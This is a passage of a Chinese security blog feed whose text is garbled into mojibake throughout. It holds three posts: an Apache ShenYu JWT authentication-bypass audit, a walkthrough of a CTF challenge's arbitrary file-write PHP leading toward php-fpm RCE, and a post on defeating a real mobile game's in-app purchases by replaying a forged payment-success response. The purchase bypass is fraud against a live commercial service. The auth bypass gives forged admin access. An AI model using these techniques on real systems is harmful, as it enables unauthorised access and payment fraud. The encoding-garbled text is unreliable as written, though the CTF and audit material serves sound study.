ä¹‹ä¸€ï¼Œ2.4.1 å°†å…¶åˆ é™¤å¹¶æ·»åŠ äº† token è¿‡æœŸæ—¶é—´ï¼Œåœ¨ shenyu-admin ä¸­ã€‚</p><p>ä»¥ <a href="https://archive.apache.org/dist/incubator/shenyu/2.4.0/apache-shenyu-incubating-2.4.0-src.zip">apache-shenyu-incubating-2.4.0</a> æºä»£ç å®¡è®¡ã€‚</p><p>çœ‹äº†ä¸€ä¸‹æ˜¯ shiro è®¤è¯æ¡†æ¶ï¼Œæœ‰ä¸¤ç§è®¤è¯æ–¹å¼ï¼Œä¸€ç§æ˜¯ username &amp; password ï¼Œå¦ä¸€ç§å°±æ˜¯ jwt è®¤è¯ï¼Œå…ˆæ¥çœ‹ shiro é…ç½®ã€‚</p><p>org/apache/shenyu/admin/shiro/config/ShiroConfiguration.java</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211120232733285.png" alt="image-20211120232733285" style="zoom:80%;" /><p>è¿™ä¸ªæ–¹æ³•å°† ShiroFilterFactoryBean äº¤ç»™ Spring æ‰˜ç®¡ï¼Œå®šä¹‰äº†ä¸€ä¸ª filterMap å°† StatelessAuthFilter æ”¾è¿› Map ä¸­ï¼Œkey æ˜¯ statelessAuth ï¼ŒFilter ä¹Ÿæ”¾åˆ°äº†é‡Œé¢ã€‚</p><p>WhiteList ä¸­çš„æ‰€æœ‰è·¯å¾„éƒ½ä¸ç»è¿‡æ»¤æ“ä½œï¼ˆ anon ï¼‰ï¼Œå…¶ä»–éƒ½è¦ç» StatelessAuthFilter è¿‡æ»¤å™¨è¿‡æ»¤ã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211120234757816.png" alt="image-20211120234757816" style="zoom:80%;" /><p>è¿˜æœ‰ä¸ªæ–¹æ³• securityManager è‡ªå®šä¹‰äº† shiroRealm ä½œä¸º Realm ã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211121003544864.png" alt="image-20211121003544864" style="zoom:80%;" /><p>org/apache/shenyu/admin/shiro/config/ShiroRealm.java</p><p>è¿™é‡Œé¢æœ‰ä¸¤ä¸ª doGetAuthorizationInfo æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> AuthorizationInfo <span class="title">doGetAuthorizationInfo</span><span class="params">(<span class="keyword">final</span> PrincipalCollection principalCollection)</span></span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> AuthenticationInfo <span class="title">doGetAuthenticationInfo</span><span class="params">(<span class="keyword">final</span> AuthenticationToken authenticationToken)</span> </span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211121004717242.png" alt="image-20211121004717242" style="zoom:80%;" /><p>ä¸€èˆ¬ç½‘å…³éƒ½ä¼šç”¨ jwtUtils æ ¡éªŒ jwt token ï¼Œä½†è¿™é‡Œå®Œå…¨æ²¡æœ‰ï¼Œè¿™æ˜¯æ¼æ´æˆå› ä¹‹äºŒã€‚</p><p>org/apache/shenyu/admin/shiro/bean/StatelessAuthFilter.java</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211120235549509.png" alt="image-20211120235549509" style="zoom:80%;" /><p>å¦‚å›¾æ‰€ç¤ºï¼Œå°±å› ä¸ºæ²¡æœ‰æ ¡éªŒï¼Œç™»å½•é€šè¿‡ subject å¯¹è±¡ä¸»åŠ¨è°ƒç”¨æƒé™æ ¡éªŒè§¦å‘ doGetAuthorizationInfo æ–¹æ³•æ—¶ï¼Œå¯ä»¥ç›´æ¥ç”¨ç®¡ç†å‘˜ç”¨æˆ·åå’Œé»˜è®¤å¯†é’¥ç”Ÿæˆç®¡ç†å‘˜çš„ jwt ï¼Œdecode æ­£å¸¸ä»»æ„ key éƒ½èƒ½ç»•è¿‡æƒé™éªŒè¯ã€‚</p><p>æµç¨‹å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211121025627642.png" alt="image-20211121025627642" style="zoom:50%;" /><p>æ¥çœ‹ 2.4.1 æ˜¯æ€ä¹ˆä¿®å¤çš„ï¼š</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211121025053320.png" alt="image-20211121025053320"></p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211121022821840.png" alt="image-20211121022821840" style="zoom:80%;" /><p>è®¿é—® /dashboardUser æ·»åŠ  <code>X-Access-Token</code> ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211121022259328.png" alt="image-20211121022259328" style="zoom:80%;" /><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211121023012019.png" alt="image-20211121023012019"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
          <category> JAVAä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT </tag>
            
            <tag> Apache ShenYu </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ©™å…‰ V2.31.284.0923 å†…è´­ä»»æ„è®¢å•ä¿®æ”¹æ¼æ´</title>
      <link href="/posts/63c2921e/"/>
      <url>/posts/63c2921e/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çœ‹ç¾¤é‡Œæœ‰äººè¯´æ©™å…‰å¯ä»¥æŠ“åŒ…ä¿®æ”¹ï¼Œè‡ªå·±æŒ–äº†ä¸€ä¸‹å‘ç°è¿˜æ˜¯æŒºç®€å•çš„ã€‚</p><p>è¯´å®è¯çœŸçš„å¾ˆå¤šç§»åŠ¨ç«¯ app éƒ½ä¼šå‡ºç°è¿™äº›é€»è¾‘æ¼æ´ï¼ŒåŒ…æ‹¬ vx ä¸€äº›å…¬ä¼—å·æŸ¥è¯¢ä¹Ÿæ™®éå­˜åœ¨è¿™äº›ï¼ŒæŒ–åˆ°è¿‡å¥½å‡ ä¸ªã€‚</p><h2 id="æ¼æ´è¯¦æƒ…"><a href="#æ¼æ´è¯¦æƒ…" class="headerlink" title="æ¼æ´è¯¦æƒ…"></a>æ¼æ´è¯¦æƒ…</h2><p>çœŸå¿ƒè¯ï¼Œç§»åŠ¨ç«¯æŠ“åŒ… HttpCanary ï¼ˆé»„é›€ï¼‰çœŸçš„æ¯” Fiddler å¥½ç”¨å¤šäº†ï¼ŒBP æŠ“åŒ…æ—¶ä¸æ—¶æ–­ç½‘çœŸçš„å¾ˆæŠ˜ç£¨ã€‚</p><p>éšä¾¿æ‰¾ä¸ªæ¸¸æˆæ‰“å¼€å•†åŸã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118231421431.png" alt="image-20211118231421431" style="zoom: 67%;" /><p>è¿™æ—¶å€™è´­ä¹°è´¦æˆ·é²œèŠ±æ•°å¦‚æœä¸å¤Ÿå°±ä¼šæ˜¾ç¤º vx æˆ– zfb è´­ä¹°é€‰é¡¹ã€‚</p><p>é»„é›€æŠ“åŒ…ï¼Œæœ‰è¿™æ ·ä¸€ä¸ªæ¥å£è·å–è´¦æˆ·é²œèŠ±ç­‰ä¿¡æ¯ã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118231704984.png" alt="image-20211118231704984" style="zoom:67%;" /><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118231803233.png" alt="image-20211118231803233" style="zoom: 80%;" /><p>æŸ¥çœ‹å“åº”åŒ…ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118231958123.png" alt="image-20211118231958123" style="zoom: 67%;" /><p><code>rest_flower</code> å°±æ˜¯è´¦æˆ·å‰©ä½™é²œèŠ±æ•°ã€‚</p><p>é»„é›€æœ‰ä¸ªåŠŸèƒ½å«é‡å†™å™¨ï¼ŒæŠ“åˆ°è¿™ä¸ªåŒ…å°±ä¼šè‡ªåŠ¨æ”¹å†™é‡å‘ï¼ŒæŠŠé²œèŠ±æ•°æ”¹ 5000 ã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118232355465.png" alt="image-20211118232355465.png" style="zoom:67%;" /><p>è¿™æ—¶å†å›åˆ°åˆ›å»ºè®¢å•çš„é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»ä¿®æ”¹æˆåŠŸäº†ï¼Œä½†æˆ‘ä»¬å®é™…çš„è´¦æˆ·é²œèŠ±ä½™é¢è¿˜æ˜¯åªæœ‰ 0 ï¼Œè´­ä¹°å¯ä»¥çœ‹åˆ°è¿˜æ˜¯ä¸æˆåŠŸçš„ã€‚</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118232637191.png" alt="image-20211118232637191" style="zoom:67%;" /><p>å‘ç°äº†è¿™ä¸ªæ¥å£ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118232734482.png" alt="image-20211118232734482" style="zoom:80%;" /><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118232752861.png" alt="image-20211118232752861" style="zoom: 80%;" /><p>æ²¡åŠæ³•ï¼Œè´¡çŒ® 6 å—é’±ä¹°äº†äº›ç‰©å“è·å–æ”¯ä»˜æˆåŠŸçš„å“åº”å†…å®¹ï¼Œé‡å†™é‡å‘ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118233316217.png" alt="image-20211118233316217" style="zoom: 80%;" /><p>é‡å†™åè´­ä¹°æˆåŠŸï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211118233357371.png" alt="image-20211118233357371" style="zoom:67%;" /><p>é¢†ç´¯å……å¥–åŠ±ä¹Ÿå¾ˆç®€å•ï¼Œè¿™ä¸ªæ¥å£ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211119193142273.png" alt="image-20211119193142273" style="zoom:80%;" /><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20211119193054478.png" alt="image-20211119193054478" style="zoom:67%;" /><p><code>fresh_flower_num</code> å°±æ˜¯å·²ç»åœ¨è¿™ä¸ªä½œå“ä¸ŠèŠ±è´¹çš„è™šæ‹Ÿè´§å¸æ•°ï¼Œä¿®æ”¹å³å¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€»è¾‘æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä» hxp 2020 ä¸€é“é¢˜æ¥çœ‹åˆ©ç”¨ ftp ä¸ php-fpm å¯¹è¯ RCE</title>
      <link href="/posts/f5e7bdc4/"/>
      <url>/posts/f5e7bdc4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ã€‚</p></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨æ’°å†™ CVE-2021-3129 Laravel Debug mode RCE æ¼æ´åˆ†æçš„æ–‡ç« æ—¶ï¼Œæ¼æ´åŸä½œè€…åœ¨æ–‡ç« æœ€åæå‡ºäº†åˆ©ç”¨ ftp ä¸ php-fpm å¯¹è¯ RCE çš„æ€è·¯ï¼ŒåŒæ—¶ç»™å‡ºäº†å‚è€ƒä¾‹é¢˜ hxp 2020 resonator ï¼Œè¶ç€è¿˜ä½™æœ‰å°è±¡ï¼Œæˆ‘ä¾¿å†™ä¸‹äº†è¿™ç¯‡æ–‡ç« ï¼š</p><p>ä¸€æ˜¯å¤ç° hxp 2020 resonator ï¼Œå¹¶å°†å…¶ä½œä¸ºä¾‹é¢˜å¼•å…¥ï¼Œæ·±å…¥å‰–æåŸç†ï¼Œæœ€åå†æ¥ç®€å•å›é¡¾ä¸€ä¸‹ CVE-2021-3129 ï¼ŒåŒºåˆ«ä¸¤è€…ã€‚</p><p>æ€»ä¹‹ï¼Œå¦‚æœ‰ä¸å½“ï¼Œçƒ¦è¯·è¯„è®ºæ‰è™«ï¼Œæˆ‘ä¼šåœ¨ç¬¬ä¸€æ—¶é—´å“åº”å¹¶è¯„è®ºæç¤ºï¼Œè°¢è°¢ã€‚</p><h2 id="å¼•é¢˜"><a href="#å¼•é¢˜" class="headerlink" title="å¼•é¢˜"></a>å¼•é¢˜</h2><h3 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h3><p>é¢˜ç›®æºæ–‡ä»¶ï¼š</p><p><a href="https://2020.ctf.link/assets/files/resonator-341a26a12c5ac4ad.tar.xz">https://2020.ctf.link/assets/files/resonator-341a26a12c5ac4ad.tar.xz</a></p><p>hxp 2020 é¢˜ç›®è™šæ‹Ÿæœºç¯å¢ƒï¼ˆç§å­ï¼‰ï¼š</p><p><a href="https://ctf.link/hxp_ctf_2020.ova.torrent">https://ctf.link/hxp_ctf_2020.ova.torrent</a></p><p>ä¸ºäº†èŠ‚çœé…ç½®ç¯å¢ƒçš„æ—¶é—´ï¼Œæˆ‘ç›´æ¥ç”¨è™šæ‹Ÿæœºæ­å»ºäº†ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210215142412720.png" alt="image-20210215142412720" style="zoom:80%;" /><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™é¢˜åªæœ‰çŸ­å°ç²¾æ‚çš„äº”è¡Œä»£ç ï¼š</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;/tmp/file&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>file é»˜è®¤è·¯å¾„ <code>/tmp/file</code> ï¼Œdata é»˜è®¤ä¸‹ä¸º <code>:)</code> ï¼Œå†å°±æ˜¯ä¸¤ä¸ªæ–‡ä»¶æ“ä½œï¼ŒæŠŠ data æ•°æ®å†™è¿› file æ–‡ä»¶ï¼Œç„¶åè¯»å–æ˜¾ç¤ºåˆ°é¡µé¢ï¼š</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210215142431013.png" alt="image-20210215142431013" style="zoom:80%;" /><p>file å’Œ data æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œèƒ½ä»»æ„æ–‡ä»¶è¯»å†™ï¼Œä½†äº‹å®çœŸçš„é‚£ä¹ˆç®€å•å—ï¼Ÿ</p><p>Dockerfile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;hxp&#123;FLAG&#125;&#x27;</span> &gt; flag.txt &amp;&amp; docker build -t resonator . &amp;&amp; docker run --cap-add=SYS_ADMIN --security-opt apparmor=unconfined -ti -p 8009:80 resonator</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> åŸºäº debian buster é•œåƒ</span></span><br><span class="line">FROM debian:buster</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ³¨æ„ä¸‹è½½äº† php-fpm</span></span><br><span class="line">RUN DEBIAN_FRONTEND=noninteractive apt-get update &amp;&amp; \</span><br><span class="line">    apt-get install -y \</span><br><span class="line">        nginx \</span><br><span class="line">        php-fpm \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/</span><br><span class="line"></span><br><span class="line">RUN rm -rf /var/www/html/*</span><br><span class="line">COPY docker-stuff/default /etc/nginx/sites-enabled/default</span><br><span class="line"><span class="meta">#</span><span class="bash"> php-fpm è¿›ç¨‹æœåŠ¡çš„æ‰©å±•é…ç½®æ–‡ä»¶</span></span><br><span class="line">COPY docker-stuff/www.conf /etc/php/7.3/fpm/pool.d/www.conf</span><br><span class="line"></span><br><span class="line">COPY flag.txt docker-stuff/readflag /</span><br><span class="line"><span class="meta">#</span><span class="bash"> æŒ‡å®š flag æ–‡ä»¶å’Œç›®å½•çš„æ‹¥æœ‰è€…å˜ä¸º ID 1337 ç»„ ID ä¸º 0 çš„ç”¨æˆ·</span></span><br><span class="line">RUN chown 0:1337 /flag.txt /readflag &amp;&amp; \</span><br><span class="line"><span class="meta">#</span><span class="bash"> flag æ–‡ä»¶ä»…åŒç”¨æˆ·ç»„å¯è¯»</span></span><br><span class="line">    chmod 040 /flag.txt &amp;&amp; \</span><br><span class="line"><span class="meta">#</span><span class="bash"> flag ç›®å½•æ‰€æœ‰ç”¨æˆ·å¯è¯»å¯æ‰§è¡Œï¼Œä¸å¯å†™</span></span><br><span class="line">    chmod 2555 /readflag</span><br><span class="line"></span><br><span class="line">COPY index.php /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> æŒ‡å®š /var/www ç›®å½•æ‹¥æœ‰è€…ä¸º root</span></span><br><span class="line">RUN chown -R root:root /var/www &amp;&amp; \</span><br><span class="line"><span class="meta">#</span><span class="bash"> åœ¨ /var/www ç›®å½•ä¸‹ find è¿‡çš„ç›®å½•åªèƒ½è¢«è¯»å’Œæ‰§è¡Œï¼Œä¸€èˆ¬æ–‡ä»¶åªè¯»</span></span><br><span class="line">    find /var/www -type d -exec chmod 555 &#123;&#125; \; &amp;&amp; \</span><br><span class="line">    find /var/www -type f -exec chmod 444 &#123;&#125; \;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>è¿›è¡Œäº†éå¸¸ä¸¥æ ¼çš„æ–‡ä»¶æƒé™è®¾ç½®ï¼Œæˆ‘ä»¬èƒ½è‡ªç”±è¯»å†™çš„åªæœ‰ <code>/tmp/file</code> ï¼Œ<code>www.conf</code> é…ç½®æ–‡ä»¶ä¹Ÿè¯´æ˜äº†æˆ‘ä»¬æ˜¯ <code>www-data</code> ç”¨æˆ·ç»„ã€‚</p><p><a href="http://www.conf/">www.conf</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[www]</span><br><span class="line">user = www-data</span><br><span class="line">group = www-data</span><br><span class="line">listen = 127.0.0.1:9000</span><br><span class="line">listen.owner = www-data</span><br><span class="line">listen.group = www-data</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ç›‘å¬ç«¯å£ 9000 ï¼Œå¹¶ä¸”ç‚¹æ˜äº†<strong>è¿™æ˜¯ TCP é€šä¿¡æ–¹å¼è€Œé UNIX åŸŸé€šä¿¡</strong>ã€‚</p><p>æ‹“å±•ä¸€ä¸‹ UNIX domain socket æ¨¡å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">listen = /opt/php/var/run/php-fpm.sock</span><br><span class="line">or</span><br><span class="line">listen = /dev/shm/php-fpm.sock</span><br></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬è¦è¯»å– flag åªèƒ½é€šè¿‡æ‰§è¡Œå‰©ä¸‹çš„ readflag è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶è·å–ï¼Œè¿™å°±è¦æ±‚æˆ‘ä»¬å…ˆ getshellï¼Œé‚£ä¹ˆ php-fpm å°±æœ‰å¯ç”¨ä¹‹å¤„äº†â€”â€”åˆ©ç”¨ fastcgi è¿›è¡Œ getshell ã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå¦‚æœå¯ä»¥å°†ä»»æ„äºŒè¿›åˆ¶æ•°æ®åŒ…å‘é€åˆ° php-fpm æœåŠ¡ï¼Œåˆ™å¯ä»¥æ‰§è¡Œä»£ç ã€‚ æ­¤æŠ€æœ¯é€šå¸¸ä¸ <code>gopher://</code> åè®®ç»“åˆä½¿ç”¨ï¼ˆssrfï¼‰ï¼Œè¯¥åè®®å— curl æ”¯æŒï¼Œ<strong>ä½†ä¸å— php æ”¯æŒ</strong>ã€‚</p><p>å› æ­¤æˆ‘ä»¬å†æ¥çœ‹ <a href="https://www.php.net/manual/zh/wrappers.php#wrappers">phpæ”¯æŒçš„åè®®å’Œå°è£…åè®®</a> æ˜¯å¦æœ‰å¯ä»£æ›¿å‘äºŒè¿›åˆ¶åŒ…çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">-pass å› ä¸ºæƒé™é—®é¢˜ç»å¤§éƒ¨åˆ†ä¸èƒ½åˆ©ç”¨</span><br><span class="line"></span><br><span class="line">http:// â€” è®¿é—® HTTP(s) ç½‘å€</span><br><span class="line">-pass è™½ç„¶å¯ä»¥åˆ©ç”¨ file_get_contents() è®¿é—® URLï¼Œä½†åªèƒ½å‘æŒ¥æ‰«æç«¯å£è¿™äº›ä¸ç—›ä¸ç—’çš„ä½œç”¨</span><br><span class="line"></span><br><span class="line">ftp:// â€” è®¿é—® FTP(s) URLs</span><br><span class="line"></span><br><span class="line">php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</span><br><span class="line">zlib:// â€” å‹ç¼©æµ</span><br><span class="line">data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span><br><span class="line">glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><br><span class="line">-pass æ— ç”¨</span><br><span class="line"></span><br><span class="line">phar:// â€” PHP å½’æ¡£</span><br><span class="line">-pass æ²¡æœ‰åˆ©ç”¨é“¾ï¼Œæ›´ä½•å†µè¿˜éœ€è¦ phar.readonly = 0</span><br><span class="line"></span><br><span class="line">ssh2:// â€” Secure Shell 2</span><br><span class="line">rar:// â€” RAR</span><br><span class="line">ogg:// â€” éŸ³é¢‘æµ</span><br><span class="line">expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ</span><br><span class="line">-pass ä»¥ä¸Šå››ä¸ªéƒ½éœ€è¦å®‰è£… PECL æ‰©å±•</span><br></pre></td></tr></table></figure><p>å”¯ä¸€å‰©ä¸‹çš„åªæœ‰ <code>ftp://</code>  ï¼Œå†µä¸” ftp æœ¬èº«ä¹Ÿæ˜¯åŸºäº tcp çš„æœåŠ¡ï¼Œèƒ½é…åˆ php-fpm è¿›è¡Œ tcp é€šä¿¡ã€‚</p><p>è€Œå…³äº ftpï¼Œä¸ºäº†åç»­ç†è§£ï¼Œæœ‰å¿…è¦å¯¹å…¶ä¸¤ç§ä¼ è¾“æ¨¡å¼ä½œä»‹ç»ã€‚</p><blockquote><p><strong>ftp çš„ä¸¤ç§ä¼ è¾“æ¨¡å¼</strong></p><p>ftp æœ‰ä¸¤ç§ä½¿ç”¨æ¨¡å¼ï¼šä¸»åŠ¨æ¨¡å¼ï¼ˆportï¼‰å’Œè¢«åŠ¨æ¨¡å¼ï¼ˆpasvï¼‰ã€‚</p><p>port è¦æ±‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯åŒæ—¶æ‰“å¼€å¹¶ä¸”ç›‘å¬ä¸€ä¸ªç«¯å£ä»¥åˆ›å»ºè¿æ¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯ç”±äºå®‰è£…äº†é˜²ç«å¢™ä¼šäº§ç”Ÿä¸€äº›é—®é¢˜ï¼Œè¿æ¥æœ‰æ—¶å€™ä¼šè¢«å®¢æˆ·ç«¯çš„é˜²ç«å¢™é˜»æ­¢ã€‚æ‰€ä»¥ï¼Œåˆ›ç«‹äº† pasv ã€‚pasv åªè¦æ±‚æœåŠ¡å™¨ç«¯äº§ç”Ÿä¸€ä¸ªç›‘å¬ç›¸åº”ç«¯å£çš„è¿›ç¨‹ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å®¢æˆ·ç«¯å®‰è£…äº†é˜²ç«å¢™çš„é—®é¢˜ã€‚</p><p>ftp å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´éœ€è¦å»ºç«‹ä¸¤æ¡ tcp è¿æ¥ï¼Œä¸€æ¡æ˜¯æ§åˆ¶è¿æ¥ï¼ˆ 21 ç«¯å£ï¼‰ï¼Œç”¨æ¥å‘é€æ§åˆ¶æŒ‡ä»¤ï¼Œå¦å¤–ä¸€æ¡æ˜¯æ•°æ®è¿æ¥ï¼ˆ 20 ç«¯å£ / éšæœºç«¯å£ï¼‰ï¼ŒçœŸæ­£çš„æ–‡ä»¶ä¼ è¾“æ˜¯é€šè¿‡æ•°æ®è¿æ¥æ¥å®Œæˆçš„ã€‚</p><p><strong>ä¸¤ç§ä¼ è¾“æ¨¡å¼çš„å¼‚åŒ</strong></p><p>å¯¹äºä¸¤ç§ä¼ è¾“æ¨¡å¼æ¥è¯´ï¼Œæ§åˆ¶è¿æ¥çš„å»ºç«‹è¿‡ç¨‹éƒ½æ˜¯ä¸€æ ·ï¼Œå‡ä¸ºæœåŠ¡å™¨ç›‘å¬ 21 å·ç«¯å£ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨çš„è¯¥ç«¯å£å‘èµ· tcp è¿æ¥ã€‚</p><p>ä¸¤ç§ä¼ è¾“æ¨¡å¼çš„ä¸åŒä¹‹å¤„ä½“ç°åœ¨æ•°æ®è¿æ¥çš„å»ºç«‹ï¼Œå¯¹äºæ•°æ®è¿æ¥çš„å»ºç«‹ï¼Œä¸»è¢«åŠ¨æ¨¡å¼çš„ä¸åŒåœ¨äºæ•°æ®è¿æ¥çš„å»ºç«‹â€œæœåŠ¡å™¨â€æ˜¯â€œä¸»åŠ¨â€è¿˜æ˜¯â€è¢«åŠ¨â€ï¼š</p><p>port æœåŠ¡å™¨é€šè¿‡æ§åˆ¶è¿æ¥çŸ¥é“å®¢æˆ·ç«¯ç›‘å¬çš„ç«¯å£åï¼Œä½¿ç”¨<u>è‡ªå·±çš„ 20 å·ç«¯å£ä½œä¸ºæºç«¯å£</u>ï¼Œ<u>æœåŠ¡å™¨â€œä¸»åŠ¨â€å‘èµ· tcp æ•°æ®è¿æ¥</u>ã€‚</p><p>pasv æœåŠ¡å™¨ç›‘å¬ 1024-65535 çš„ä¸€ä¸ª<u>éšæœºç«¯å£</u>ï¼Œå¹¶é€šè¿‡æ§åˆ¶è¿æ¥å°†è¯¥ç«¯å£å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œ<u>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨çš„è¯¥ç«¯å£å‘èµ· tcp æ•°æ®è¿æ¥</u>ï¼Œè¿™ç§æƒ…å†µä¸‹æ•°æ®è¿æ¥çš„å»ºç«‹ç›¸å½“äºæœåŠ¡å™¨æ˜¯â€œè¢«åŠ¨â€çš„ã€‚</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/v2-2605179569cba296202a9d3250597682_720w.jpg" alt="v2-2605179569cba296202a9d3250597682_720w"></p><p>å¦‚å›¾ï¼Œå¯¹äºæˆ‘ä»¬è¿™é¢˜ï¼Œæ˜¾ç„¶åªèƒ½ç”¨ pasv æ¨¡å¼ï¼ŒæœåŠ¡å™¨ç›‘å¬çš„â€œéšæœºç«¯å£â€å¯¹åº” 